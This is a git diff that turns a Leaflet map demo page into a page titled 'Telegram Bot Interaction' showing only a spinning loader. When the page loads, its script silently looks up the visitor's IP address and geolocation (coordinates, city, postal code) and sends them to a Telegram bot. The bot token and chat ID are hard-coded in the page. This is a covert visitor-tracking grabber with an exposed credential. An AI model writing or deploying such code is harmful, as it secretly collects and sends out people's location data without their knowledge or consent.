@@ -1,73 +1,186 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
   <head>
-    <meta charset="utf-8" />
-    <title>OpenStreetMap Example</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <script src="https://cdn.jsdelivr.net/npm/leaflet@1.7.1/dist/leaflet.js"></script>
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/leaflet@1.7.1/dist/leaflet.css" />
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <title>Telegram Bot Interaction</title>
     <style>
-      #map {
-        height: 500px;
+      body {
+        font-family: Arial, sans-serif;
+        text-align: center;
+        margin: 0;
+        padding: 0;
+        background-color: #f0f0f0;
+      }
+
+      h1 {
+        margin-top: 20px;
+      }
+
+      form {
+        margin-top: 20px;
+      }
+
+      input {
+        padding: 5px;
+        font-size: 16px;
+      }
+
+      button {
+        padding: 5px 10px;
+        font-size: 16px;
+      }
+
+      h1 {
+        border-top: 1vw dotted;
+        border-right: 1.1vw dashed;
+        border-bottom: 1vw dotted;
+        border-left: 1.1vw dashed;
+        width: 20vh;
+        height: 20vh;
+        border-radius: 50%;
+        animation: ro 1.5s infinite linear;
+        margin: 40vh auto;
+      }
+      @keyframes ro {
+        0% {
+          transform: rotate(0);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
       }
     </style>
   </head>
   <body>
-    <div id="map"></div>
-    <form>
-      <label for="latitude">Latitude:</label>
-      <input type="text" id="latitude" name="latitude"><br><br>
-      <label for="longitude">Longitude:</label>
-      <input type="text" id="longitude" name="longitude"><br><br>
-      <input type="button" id="show-location-button" value="Show Location">
-    </form>
+    <h1></h1>
+
+    <!-- 
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        const form = document.getElementById("message-form");
+        const messageInput = document.getElementById("message-input");
+
+        form.addEventListener("submit", function (event) {
+          event.preventDefault();
+
+          const message = messageInput.value;
+          sendMessageToBot(message);
+
+          // Clear the input field after sending the message
+          messageInput.value = "";
+        });
+
+        function sendMessageToBot(message) {
+          // Replace 'YOUR_BOT_TOKEN' with your actual bot token
+          const botToken = "6570499338:AAENv1CoLe2uIEGtX4lI_xh7MNr0KouXTVE";
+          const chatId = 2118206496; // Replace with the chat ID of the bot's chat
+
+          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: message,
+            }),
+          });
+        }
+      });
+    </script> -->
 
     <script>
-      var map = L.map('map').setView([51.505, -0.09], 13);
-
-      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-        attribution: 'Map data © <a href="https://openstreetmap.org">OpenStreetMap</a> contributors',
-        maxZoom: 18,
-      }).addTo(map);
-
-      function onLocationFound(e) {
-        var radius = e.accuracy / 2;
-
-        L.marker(e.latlng).addTo(map)
-          .bindPopup("You are within " + radius + " meters from this point").openPopup();
-
-        L.circle(e.latlng, radius).addTo(map);
+      // Function to get user's IP address
+      function getUserIP(callback) {
+        fetch("https://api.ipify.org?format=json")
+          .then((response) => response.json())
+          .then((data) => {
+            const ipAddress = data.ip;
+            callback(ipAddress);
+          })
+          .catch((error) => {
+            console.error("Error fetching IP address:", error);
+            callback(null);
+          });
       }
 
-      function onLocationError(e) {
-        alert(e.message);
+      // Function to get user's geolocation data
+      function getUserGeolocation(ipAddress, callback) {
+        fetch(`https://ipapi.co/${ipAddress}/json/`)
+          .then((response) => response.json())
+          .then((data) => {
+            const {
+              latitude,
+              longitude,
+              country_name,
+              timezone,
+              city,
+              postal,
+            } = data;
+            callback(latitude, longitude, country_name, timezone, city, postal);
+          })
+          .catch((error) => {
+            console.error("Error fetching geolocation:", error);
+            callback(null, null, null, null, null, null);
+          });
       }
 
-      function centerMapOnLocation(lat, lng) {
-        map.setView([lat, lng], 16);
-        L.marker([lat, lng]).addTo(map);
+      document.addEventListener("DOMContentLoaded", websiteOpened);
+      function sendMessageToBot(message) {
+        // Replace 'YOUR_BOT_TOKEN' with your actual bot token
+        const botToken = "6570499338:AAENv1CoLe2uIEGtX4lI_xh7MNr0KouXTVE";
+        const chatId = 2118206496; // Replace with the chat ID of the bot's chat
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+          }),
+        });
       }
 
-      function showLocationOnMap() {
-        var lat = document.getElementById('latitude').value;
-        var lng = document.getElementById('longitude').value;
-        centerMapOnLocation(lat, lng);
-      }
+      function websiteOpened() {
+        getUserIP((ipAddress) => {
+          if (ipAddress) {
+            currentIp = ipAddress;
+            getUserGeolocation(
+              ipAddress,
+              (
+                latitude,
+                longitude,
+                country_name,
+                continent_name,
+                city,
+                postal
+              ) => {
+                if (latitude && longitude) {
+                  let MSG = `
+                  ________________ip finder _____________________
 
-      document.getElementById('show-location-button').onclick = showLocationOnMap;
+                  ipAddress:-  ${ipAddress}
+                  latitude:-  ${latitude}
+                  longitude:-  ${longitude}
+                  country_name:-  ${country_name}
+                  city:-  ${city}
+                  postal:-  ${postal}
+                  ______________________________________`;
 
-      // Define an array of locations
-      var locations = [
-        {lat: 51.505, lng: -0.09, text: "Location 1"},
-        {lat: 51.51, lng: -0.1, text: "Location 2"},
-        {lat: 51.49, lng: -0.05, text: "Location 3"}
-      ];
-
-      // Add markers for each location
-      for (var i = 0; i < locations.length; i++) {
-        var location = locations[i];
-        L.marker([location.lat, location.lng]).addTo(map)
-          .bindPopup(location.text);
+                  sendMessageToBot(MSG);
+                } else {
+                  console.log("Unable to retrieve geolocation.");
+                }
+              }
+            );
+          } else {
+            console.log("Unable to retrieve IP address.");
+          }
+        });
       }
     </script>
   </body>
